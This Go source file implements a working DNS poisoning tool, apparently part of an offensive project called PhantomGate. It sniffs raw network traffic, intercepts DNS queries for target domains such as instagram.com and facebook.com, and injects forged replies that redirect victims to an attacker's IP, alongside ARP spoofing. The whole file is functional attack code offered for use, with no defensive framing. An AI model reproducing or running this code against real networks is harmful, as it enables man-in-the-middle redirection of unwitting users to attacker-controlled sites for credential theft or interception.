package dns

import (
	"encoding/binary"
	"fmt"
	"log"
	"net"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
)

// Poisoner performs inline DNS poisoning by sniffing DNS queries on the
// network and injecting forged responses before the real DNS server can reply.
// Combined with ARP spoofing, all victim DNS traffic flows through us —
// we intercept target queries and forge responses pointing to PhantomGate's IP.
//
// This does NOT run a DNS server. It poisons the REAL DNS traffic on the wire.
type Poisoner struct {
	iface       string
	redirectIP  net.IP          // PhantomGate's IP — where victims get redirected
	targets     map[string]bool // domains to poison
	mu          sync.RWMutex
	stats       PoisonStats
	running     bool
	stopChan    chan struct{}
	rawFD       int             // Raw socket for packet sniffing
	sendFD      int             // Raw socket for packet injection
	ifaceIndex  int
}

type PoisonStats struct {
	PacketsSniffed    int64
	DNSQueriesSeen    int64
	ResponsesInjected int64
	QueriesIgnored    int64
}

func (p *Poisoner) incPackets()    { atomic.AddInt64(&p.stats.PacketsSniffed, 1) }
func (p *Poisoner) incQueries()    { atomic.AddInt64(&p.stats.DNSQueriesSeen, 1) }
func (p *Poisoner) incInjected()   { atomic.AddInt64(&p.stats.ResponsesInjected, 1) }
func (p *Poisoner) incIgnored()    { atomic.AddInt64(&p.stats.QueriesIgnored, 1) }

// PoisonerConfig configures the DNS poisoner
type PoisonerConfig struct {
	// Network interface to sniff on (e.g., "eth0")
	Interface string
	// IP to redirect poisoned domains to (PhantomGate's listener IP)
	RedirectIP string
	// Domains to poison (e.g., ["instagram.com", "facebook.com"])
	TargetDomains []string
	// TTL for forged DNS responses (seconds)
	TTL uint32
}

// NewPoisoner creates a new inline DNS poisoner
func NewPoisoner(cfg PoisonerConfig) (*Poisoner, error) {
	redirectIP := net.ParseIP(cfg.RedirectIP).To4()
	if redirectIP == nil {
		return nil, fmt.Errorf("invalid redirect IP: %s", cfg.RedirectIP)
	}

	iface, err := net.InterfaceByName(cfg.Interface)
	if err != nil {
		return nil, fmt.Errorf("interface '%s' not found: %w", cfg.Interface, err)
	}

	// Normalize target domains
	targets := make(map[string]bool)
	for _, d := range cfg.TargetDomains {
		d = strings.ToLower(strings.TrimSuffix(d, "."))
		targets[d] = true
	}

	ttl := cfg.TTL
	if ttl == 0 {
		ttl = 600
	}

	return &Poisoner{
		iface:      cfg.Interface,
		redirectIP: redirectIP,
		targets:    targets,
		stopChan:   make(chan struct{}),
		ifaceIndex: iface.Index,
	}, nil
}

// AddTarget adds a domain to the poison list at runtime
func (p *Poisoner) AddTarget(domain string) {
	p.mu.Lock()
	defer p.mu.Unlock()
	domain = strings.ToLower(strings.TrimSuffix(domain, "."))
	p.targets[domain] = true
	log.Printf("[DNS POISON] Added target: %s", domain)
}

// RemoveTarget removes a domain from the poison list
func (p *Poisoner) RemoveTarget(domain string) {
	p.mu.Lock()
	defer p.mu.Unlock()
	domain = strings.ToLower(strings.TrimSuffix(domain, "."))
	delete(p.targets, domain)
	log.Printf("[DNS POISON] Removed target: %s", domain)
}

// Start begins sniffing and poisoning DNS traffic
func (p *Poisoner) Start() error {
	// Open raw socket to sniff all IP traffic (requires root/CAP_NET_RAW)
	var err error
	// ETH_P_ALL captures ALL ethernet frames on the wire including forwarded victim traffic.
	// ETH_P_IP would only see packets destined FOR us — we need to see the victim's traffic.
	p.rawFD, err = syscall.Socket(syscall.AF_PACKET, syscall.SOCK_RAW, int(htons(0x0003))) // ETH_P_ALL
	if err != nil {
		return fmt.Errorf("failed to open raw socket (requires root): %w", err)
	}

	// Bind to specific interface
	sa := syscall.SockaddrLinklayer{
		Protocol: htons(syscall.ETH_P_IP),
		Ifindex:  p.ifaceIndex,
	}
	if err := syscall.Bind(p.rawFD, &sa); err != nil {
		syscall.Close(p.rawFD)
		return fmt.Errorf("failed to bind raw socket to %s: %w", p.iface, err)
	}

	// Open a second raw socket for sending forged packets
	p.sendFD, err = syscall.Socket(syscall.AF_PACKET, syscall.SOCK_RAW, int(htons(syscall.ETH_P_IP)))
	if err != nil {
		syscall.Close(p.rawFD)
		return fmt.Errorf("failed to open send socket: %w", err)
	}

	p.running = true

	log.Printf("[☠️  DNS POISONER] Active on %s", p.iface)
	log.Printf("[☠️  DNS POISONER] Redirecting %d domains → %s", len(p.targets), p.redirectIP)
	for domain := range p.targets {
		log.Printf("[☠️  DNS POISONER]   • %s", domain)
	}

	go p.sniffLoop()
	return nil
}

// Stop halts the DNS poisoner
func (p *Poisoner) Stop() {
	p.running = false
	close(p.stopChan)
	if p.rawFD > 0 {
		syscall.Close(p.rawFD)
	}
	if p.sendFD > 0 {
		syscall.Close(p.sendFD)
	}
	log.Printf("[DNS POISONER] Stopped. Injected %d forged responses out of %d DNS queries",
		p.stats.ResponsesInjected, p.stats.DNSQueriesSeen)
}

// GetStats returns poisoning statistics
func (p *Poisoner) GetStats() PoisonStats {
	return PoisonStats{
		PacketsSniffed:    atomic.LoadInt64(&p.stats.PacketsSniffed),
		DNSQueriesSeen:    atomic.LoadInt64(&p.stats.DNSQueriesSeen),
		ResponsesInjected: atomic.LoadInt64(&p.stats.ResponsesInjected),
		QueriesIgnored:    atomic.LoadInt64(&p.stats.QueriesIgnored),
	}
}

// sniffLoop reads raw packets and extracts DNS queries
func (p *Poisoner) sniffLoop() {
	buf := make([]byte, 65535)

	for p.running {
		n, _, err := syscall.Recvfrom(p.rawFD, buf, 0)
		if err != nil {
			if p.running {
				continue
			}
			return
		}
		if n < 42 { // Minimum: 14 (eth) + 20 (IP) + 8 (UDP)
			continue
		}

		p.incPackets()

		packet := make([]byte, n)
		copy(packet, buf[:n])

		go p.processPacket(packet)
	}
}

// processPacket checks if a packet is a DNS query and poisons it if the domain matches
func (p *Poisoner) processPacket(packet []byte) {
	// Parse Ethernet header (14 bytes)
	if len(packet) < 14 {
		return
	}
	ethDstMAC := packet[0:6]
	ethSrcMAC := packet[6:12]
	ethType := binary.BigEndian.Uint16(packet[12:14])

	if ethType != 0x0800 { // Not IPv4
		return
	}

	// Parse IP header (starts at offset 14)
	ipHeader := packet[14:]
	if len(ipHeader) < 20 {
		return
	}

	ipVersion := ipHeader[0] >> 4
	if ipVersion != 4 {
		return
	}

	ipHeaderLen := int(ipHeader[0]&0x0f) * 4
	ipTotalLen := int(binary.BigEndian.Uint16(ipHeader[2:4]))
	protocol := ipHeader[9]
	srcIP := net.IP(ipHeader[12:16])
	dstIP := net.IP(ipHeader[16:20])

	if protocol != 17 { // Not UDP
		return
	}

	// Parse UDP header (starts after IP header)
	if len(ipHeader) < ipHeaderLen+8 {
		return
	}
	udpHeader := ipHeader[ipHeaderLen:]
	srcPort := binary.BigEndian.Uint16(udpHeader[0:2])
	dstPort := binary.BigEndian.Uint16(udpHeader[2:4])

	if dstPort != 53 { // Not a DNS query
		return
	}

	// Parse DNS payload
	dnsPayload := udpHeader[8:]
	if len(dnsPayload) < 12 {
		return
	}

	p.incQueries()

	txnID := binary.BigEndian.Uint16(dnsPayload[0:2])
	flags := binary.BigEndian.Uint16(dnsPayload[2:4])
	isResponse := (flags & 0x8000) != 0
	qdCount := binary.BigEndian.Uint16(dnsPayload[4:6])

	if isResponse || qdCount == 0 {
		return
	}

	// Parse the query name
	queryName, queryEnd := parseDNSName(dnsPayload, 12)
	if queryName == "" || queryEnd+4 > len(dnsPayload) {
		return
	}

	queryType := binary.BigEndian.Uint16(dnsPayload[queryEnd : queryEnd+2])
	// queryClass := binary.BigEndian.Uint16(dnsPayload[queryEnd+2 : queryEnd+4])

	if queryType != 1 { // Only poison A records (IPv4)
		return
	}

	normalizedName := strings.ToLower(strings.TrimSuffix(queryName, "."))

	// Check if this domain is in our target list
	if !p.shouldPoison(normalizedName) {
		p.incIgnored()
		return
	}

	// === FORGE THE DNS RESPONSE ===
	log.Printf("[☠️  DNS POISON] %s queried by %s → injecting %s",
		normalizedName, srcIP, p.redirectIP)

	forgedDNS := p.forgeDNSResponse(dnsPayload, txnID, queryEnd)

	// Build the forged packet (swap src/dst at every layer)
	forgedPacket := p.buildForgedPacket(
		ethSrcMAC, ethDstMAC, // Swap Ethernet MACs
		dstIP, srcIP,         // Swap IPs (we respond AS the DNS server)
		dstPort, srcPort,     // Swap ports (53 → victim's src port)
		forgedDNS,
		ipTotalLen, ipHeaderLen,
	)

	// Inject the forged response
	p.injectPacket(forgedPacket)

	p.incInjected()
}

// shouldPoison checks if a domain should be poisoned (exact + subdomain match)
func (p *Poisoner) shouldPoison(domain string) bool {
	p.mu.RLock()
	defer p.mu.RUnlock()

	// Exact match
	if p.targets[domain] {
		return true
	}

	// Subdomain match: "www.instagram.com" matches target "instagram.com"
	parts := strings.Split(domain, ".")
	for i := 1; i < len(parts); i++ {
		parent := strings.Join(parts[i:], ".")
		if p.targets[parent] {
			return true
		}
	}

	return false
}

// forgeDNSResponse creates a forged DNS response payload
func (p *Poisoner) forgeDNSResponse(originalQuery []byte, txnID uint16, queryEnd int) []byte {
	// Copy the question section from the original query
	questionSection := originalQuery[12 : queryEnd+4]

	// Build response
	resp := make([]byte, 0, 12+len(questionSection)+16)

	// DNS Header (12 bytes)
	header := make([]byte, 12)
	binary.BigEndian.PutUint16(header[0:2], txnID)       // Transaction ID (must match)
	binary.BigEndian.PutUint16(header[2:4], 0x8180)       // Flags: Response, Authoritative, Recursion Available
	binary.BigEndian.PutUint16(header[4:6], 1)            // Questions: 1
	binary.BigEndian.PutUint16(header[6:8], 1)            // Answers: 1
	binary.BigEndian.PutUint16(header[8:10], 0)           // Authority: 0
	binary.BigEndian.PutUint16(header[10:12], 0)          // Additional: 0
	resp = append(resp, header...)

	// Question section (copied from query)
	resp = append(resp, questionSection...)

	// Answer section — A record pointing to our IP
	answer := make([]byte, 16)
	binary.BigEndian.PutUint16(answer[0:2], 0xC00C)   // Name pointer to question
	binary.BigEndian.PutUint16(answer[2:4], 1)         // Type: A
	binary.BigEndian.PutUint16(answer[4:6], 1)         // Class: IN
	binary.BigEndian.PutUint32(answer[6:10], 1)        // TTL: 1 second — ensures poison takes effect immediately
	binary.BigEndian.PutUint16(answer[10:12], 4)       // Data length: 4 bytes
	copy(answer[12:16], p.redirectIP.To4())             // The poisoned IP!
	resp = append(resp, answer...)

	return resp
}

// buildForgedPacket constructs a complete Ethernet+IP+UDP packet with the forged DNS response
func (p *Poisoner) buildForgedPacket(
	dstMAC, srcMAC []byte,
	srcIP, dstIP net.IP,
	srcPort, dstPort uint16,
	dnsPayload []byte,
	origIPLen, ipHeaderLen int,
) []byte {
	udpLen := 8 + len(dnsPayload)
	ipLen := 20 + udpLen
	totalLen := 14 + ipLen

	pkt := make([]byte, totalLen)

	// --- Ethernet Header (14 bytes) ---
	copy(pkt[0:6], dstMAC)
	copy(pkt[6:12], srcMAC)
	binary.BigEndian.PutUint16(pkt[12:14], 0x0800) // IPv4

	// --- IP Header (20 bytes, no options) ---
	ip := pkt[14:]
	ip[0] = 0x45                                        // Version 4, IHL 5
	ip[1] = 0x00                                        // DSCP/ECN
	binary.BigEndian.PutUint16(ip[2:4], uint16(ipLen))  // Total length
	binary.BigEndian.PutUint16(ip[4:6], 0x1337)         // Identification
	binary.BigEndian.PutUint16(ip[6:8], 0x4000)         // Flags: Don't Fragment
	ip[8] = 64                                           // TTL
	ip[9] = 17                                           // Protocol: UDP
	copy(ip[12:16], srcIP.To4())                         // Source IP (DNS server)
	copy(ip[16:20], dstIP.To4())                         // Destination IP (victim)

	// IP checksum
	binary.BigEndian.PutUint16(ip[10:12], 0)
	binary.BigEndian.PutUint16(ip[10:12], ipChecksum(ip[:20]))

	// --- UDP Header (8 bytes) ---
	udp := ip[20:]
	binary.BigEndian.PutUint16(udp[0:2], srcPort)          // Source port (53)
	binary.BigEndian.PutUint16(udp[2:4], dstPort)          // Dest port (victim's)
	binary.BigEndian.PutUint16(udp[4:6], uint16(udpLen))   // UDP length

	// --- DNS Payload (must copy BEFORE computing checksum) ---
	copy(udp[8:], dnsPayload)

	// UDP checksum must cover the actual payload — compute AFTER copy.
	binary.BigEndian.PutUint16(udp[6:8], 0) // zero field before computing
	csum := udpChecksum(srcIP, dstIP, udp[:udpLen])
	binary.BigEndian.PutUint16(udp[6:8], csum)

	return pkt
}

// injectPacket sends a forged raw packet onto the wire
func (p *Poisoner) injectPacket(packet []byte) {
	addr := syscall.SockaddrLinklayer{
		Protocol: htons(syscall.ETH_P_IP),
		Ifindex:  p.ifaceIndex,
	}
	if err := syscall.Sendto(p.sendFD, packet, 0, &addr); err != nil {
		log.Printf("[DNS POISON] Inject failed: %v", err)
	}
}

// parseDNSName extracts the domain name from a DNS packet
func parseDNSName(packet []byte, offset int) (string, int) {
	var parts []string
	pos := offset

	for pos < len(packet) {
		labelLen := int(packet[pos])

		if labelLen == 0 {
			pos++
			break
		}

		// Compression pointer
		if labelLen&0xC0 == 0xC0 {
			if pos+1 >= len(packet) {
				return "", pos
			}
			// Follow the pointer (but don't update pos for the returned offset)
			ptr := int(binary.BigEndian.Uint16(packet[pos:pos+2])) & 0x3FFF
			name, _ := parseDNSName(packet, ptr)
			parts = append(parts, name)
			pos += 2
			return strings.Join(parts, ""), pos
		}

		pos++
		if pos+labelLen > len(packet) {
			return "", pos
		}
		parts = append(parts, string(packet[pos:pos+labelLen]))
		pos += labelLen
	}

	return strings.Join(parts, "."), pos
}

// ipChecksum computes the IP header checksum
func ipChecksum(header []byte) uint16 {
	return checksumWords(header)
}

// udpChecksum computes RFC 768 UDP checksum using the IP pseudo-header.
// Without this the victim's kernel will silently discard our forged DNS reply.
func udpChecksum(srcIP, dstIP net.IP, udpSegment []byte) uint16 {
	// Build pseudo-header: src IP (4) + dst IP (4) + zero (1) + proto=17 (1) + udp length (2)
	pseudo := make([]byte, 12+len(udpSegment))
	copy(pseudo[0:4], srcIP.To4())
	copy(pseudo[4:8], dstIP.To4())
	pseudo[8] = 0
	pseudo[9] = 17 // UDP protocol
	binary.BigEndian.PutUint16(pseudo[10:12], uint16(len(udpSegment)))
	copy(pseudo[12:], udpSegment)
	return checksumWords(pseudo)
}

// checksumWords computes the one's complement checksum over a byte slice
func checksumWords(data []byte) uint16 {
	var sum uint32
	for i := 0; i+1 < len(data); i += 2 {
		sum += uint32(binary.BigEndian.Uint16(data[i : i+2]))
	}
	if len(data)%2 != 0 {
		sum += uint32(data[len(data)-1]) << 8
	}
	for sum > 0xFFFF {
		sum = (sum >> 16) + (sum & 0xFFFF)
	}
	return ^uint16(sum)
}
